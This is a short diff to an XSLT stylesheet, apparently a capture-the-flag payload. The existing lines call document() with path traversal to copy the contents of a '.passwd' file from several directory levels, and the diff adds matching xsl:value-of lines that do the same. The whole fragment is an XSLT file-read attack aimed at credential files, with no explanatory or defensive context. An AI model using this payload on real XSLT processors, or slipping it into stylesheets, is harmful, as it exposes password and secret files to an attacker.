@@ -10,6 +10,11 @@
 	<xsl:copy-of select="document('../../.passwd')"/>
 	<xsl:copy-of select="document('../../../.passwd')"/>
 	<xsl:copy-of select="document('../../../../.passwd')"/>	
+	<xsl:value-of select="document('.passwd')"/>
+	<xsl:value-of select="document('../.passwd')"/>
+	<xsl:value-of select="document('../../.passwd')"/>
+	<xsl:value-of select="document('../../../.passwd')"/>
+	<xsl:value-of select="document('../../../../.passwd')"/>	
     </p>
 </body>
 </html> 
